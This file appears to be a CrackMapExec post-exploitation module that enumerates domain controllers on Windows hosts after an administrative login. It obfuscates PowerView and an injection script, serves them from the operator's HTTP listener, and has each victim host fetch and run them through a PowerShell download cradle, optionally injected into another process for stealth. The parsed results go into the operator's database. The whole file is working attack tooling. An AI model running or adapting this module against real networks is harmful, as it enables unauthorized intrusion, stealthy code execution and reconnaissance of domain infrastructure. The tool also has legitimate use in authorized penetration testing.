from cme.helpers.powershell import *
from cme.helpers.logger import write_log, highlight
from datetime import datetime
from io import StringIO

class CMEModule:

    name = 'get_netdomaincontroller'
    description = "Enumerates all domain controllers"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = False

    def  options(self, context, module_options):
        '''
            INJECT    If set to true, this allows PowerView to work over 'stealthier' execution methods which have non-interactive contexts (e.g. WMI) (default: True)
        '''

        self.exec_methods = ['smbexec', 'atexec']
        self.inject = True
        if 'INJECT' in module_options:
            self.inject = bool(module_options['INJECT'])

        if self.inject: self.exec_methods = None
        self.ps_script1 = obfs_ps_script('cme_powershell_scripts/Invoke-PSInject.ps1')
        self.ps_script2 = obfs_ps_script('powersploit/Recon/PowerView.ps1')

    def on_admin_login(self, context, connection):
        command = 'Get-NetDomainController | select Name,Domain,IPAddress | Out-String'
        launcher = gen_ps_iex_cradle(context, 'PowerView.ps1', command)

        if self.inject:
            launcher = gen_ps_inject(launcher, context, inject_once=True)

        connection.ps_execute(launcher, methods=self.exec_methods)

        context.log.success('Executed launcher')

    def on_request(self, context, request):
        if 'Invoke-PSInject.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script1)

        elif 'PowerView.ps1' == request.path[1:]:
            request.send_response(200)
            request.end_headers()

            request.wfile.write(self.ps_script2)

        else:
            request.send_response(404)
            request.end_headers()

    def on_response(self, context, response):
        response.send_response(200)
        response.end_headers()
        length = int(response.headers.get('content-length'))
        data = response.rfile.read(length).decode()

        #We've received the response, stop tracking this host
        response.stop_tracking_host()

        dc_count = 0
        if len(data):
            buf = StringIO(data).readlines()
            for line in buf:
                if line != '\r\n' and not line.startswith('Name') and not line.startswith('---'):
                    try:
                        hostname, domain, ip = filter(None, line.strip().split(' '))
                        hostname = hostname.split('.')[0].upper()
                        domain   = domain.split('.')[0].upper()
                        context.log.highlight('Hostname: {} Domain: {} IP: {}'.format(hostname, domain, ip))
                        context.db.add_computer(ip, hostname, domain, '', dc=True)
                        dc_count += 1
                    except Exception:
                        context.log.error('Error parsing Domain Controller entry')

            context.log.success('Added {} Domain Controllers to the database'.format(highlight(dc_count)))

            log_name = 'Get_NetDomainController-{}-{}.log'.format(response.client_address[0], datetime.now().strftime("%Y-%m-%d_%H%M%S"))
            write_log(data, log_name)
            context.log.info("Saved raw output to {}".format(log_name))